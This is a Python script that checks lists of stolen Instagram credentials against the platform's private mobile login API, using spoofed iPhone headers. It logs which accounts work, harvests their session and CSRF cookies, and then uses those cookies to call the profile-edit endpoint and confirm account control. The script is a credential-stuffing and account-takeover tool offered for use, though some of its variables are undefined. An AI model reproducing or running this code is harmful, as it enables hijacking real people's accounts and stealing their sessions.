#Python3
import requests, uuid, getpass, sys, time
import subprocess as sp
from colorama import Fore, init
init()

def clear():
    sp.call('clear', shell=True)

susLoginAccounts = []
successfullyLoggedIn = []
numLockedAccounts = []
workingAccounts = []
def login():
    clear()
    sp.call('ls -la', shell=True)
    myUUID = str(uuid.uuid4())
    nUserFile = input('Enter Account File: ')
    nProxy = input('Enter Proxy: ')

    with open(nUserFile, 'r') as f:
        credentials = [x.strip().split(':') for x in f.readlines()]
        for username,password,email,emailpass in credentials:
            try:
                paramsPost = {"ig_sig_key_version":"5","signed_body":"fa61f4be32e827c7152e38a075e36142d8313ba582d6437f07539b00a03f454e.{\"reg_login\":\"0\",\"password\":\""+password+"\",\"device_id\":\""+myUUID+"\",\"username\":\""+username+"\",\"adid\":\"FE4FD084-9DCB-481A-A248-57E0E32E25ED\",\"login_attempt_count\":\"0\",\"phone_id\":\""+myUUID+"\"}"}
                headers = {"Accept":"*/*","X-IG-Capabilities":"36r/Vw==","User-Agent":"Instagram 82.0.0.17.95 (iPhone9,3; iOS 12_0; en_US; en-US; scale=2.00; gamut=wide; 750x1334) AppleWebKit/420+","Connection":"close","X-IG-ABR-Connection-Speed-KBPS":"0","X-IG-Connection-Speed":"-1kbps","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US;q=1","X-IG-Connection-Type":"WiFi","X-IG-App-ID":"124024574287414","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
                r = requests.post("https://i.instagram.com/api/v1/accounts/login/", data=paramsPost, headers=headers, timeout=5)
                print(r.content)
                if "logged_in_user" in r.content.decode('utf-8'):
                    print('['+Fore.GREEN+'+'+Fore.WHITE+']'+' Successfully Logged In: '+username)
                    mSessionID = r.cookies['sessionid']
                    mCSRF = r.cookies['csrftoken']
                    mDS_USER_ID = r.cookies['ds_user_id']
                    mMID = r.cookies['mid']
                    successfullyLoggedIn.append(username+':'+password+':'+email+':'+mSessionID+':'+mCSRF+':'+mDS_USER_ID+':'+mMID)
                elif "invalid_credentials" in r.content.decode('utf-8'):
                    print('['+Fore.RED+'-'+Fore.WHITE+']'+' Incorrect Login Information: '+username+':'+password)
                    invalidAccounts = open('wrongInfoAccounts.txt', 'a')
                    invalidAccounts.writelines(username+':'+password+'\n')
                    invalidAccounts.close()
                elif "checkpoint_challenge_required" in r.content.decode('utf-8'):
                    print('['+Fore.YELLOW+'!'+Fore.WHITE+']'+' Suspicious Login: '+username+':'+password)
                    susOutput = open('susAccounts.txt', 'a')
                    susOutput.writelines(username+':'+password+'\n')
                    susOutput.close()
                elif "unusable_password" in r.content.decode('utf-8'):
                    print('['+Fore.YELLOW+'!'+Fore.WHITE+']'+' Secure Account: '+username+':'+password)
                    secureAccounts = open('secureAccounts.txt', 'a')
                    secureAccounts.writelines(username+':'+password)
                    secureAccounts.close()
                else:
                    print('Couldnt Login! Read Log.')
                    print(r.content)
            except Exception as e:
                print('Skipping User: '+username)
                print(str(e))
                pass

def tryAccounts():
    for i in range(len(successfullyLoggedIn)):
        try:
            paramsPost = {"ig_sig_key_version":"5","signed_body":"66ab4c58537eead820f066daecac18eb319af61529d3da92845e9ed7d811bcd5.{\"gender\":\"3\",\"_csrftoken\":\""+successfullyLoggedIn[i].split(':')[4]+"\",\"_uuid\":\""+myUUID+"\",\"_uid\":\""+successfullyLoggedIn[i].split(':')[5]+"\",\"external_url\":\"\",\"username\":\""+successfullyLoggedIn[i].split(':')[0]+"\",\"email\":\""+successfullyLoggedIn[i].split(':')[2]+"\",\"phone_number\":\"\",\"biography\":\"\",\"first_name\":\"\"}"}
            headers = {"Accept":"*/*","X-IG-Capabilities":"36r/Bw==","User-Agent":"Instagram 82.0.0.12.95 (iPhone9,3; iOS 12_0; en_US; en-US; scale=2.00; gamut=wide; 750x1334) AppleWebKit/420+","Connection":"close","X-IG-ABR-Connection-Speed-KBPS":"0","X-IG-Connection-Speed":"319kbps","Accept-Encoding":"gzip, deflate","Accept-Language":"en-US;q=1","X-IG-Connection-Type":"WiFi","X-IG-App-ID":"124024574287414","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"}
            cookies = {"urlgen":"\"{\\\"107.101.22.4\\\": 7922\\054 \\\"2601:2c3:877d:db77:845:4e84:b991:93f6\\\": 7922}:1h4px5:GmcZFuickg3NXINWN7E4OhGsdLc\"","igfl":successfullyLoggedIn[i].split(':')[0],"ds_user":successfullyLoggedIn[i].split(':')[0],"ds_user_id":successfullyLoggedIn[i].split(':')[5],"mid":successfullyLoggedIn[i].split(':')[6],"shbts":"1552658440.473448","sessionid":mySessionID,"csrftoken":myCSRF,"shbid":"15035","rur":"ATN","is_starred_enabled":"yes"}
            r = requests.post("https://i.instagram.com/api/v1/accounts/edit_profile/", data=paramsPost, headers=headers, cookies=cookies)
            if successfullyLoggedIn[i].split(':')[2] in r.content.decode('utf-8'):
                print('Working Freshie')
            elif "Try Again Later" in r.content.decode('utf-8'):
                print('Try Again Later?')
            else:
                print(r.content)
                print('Some Shit')
        except Exception as e:
            print(str(e))
            pass

if __name__ == '__main__':
    login()
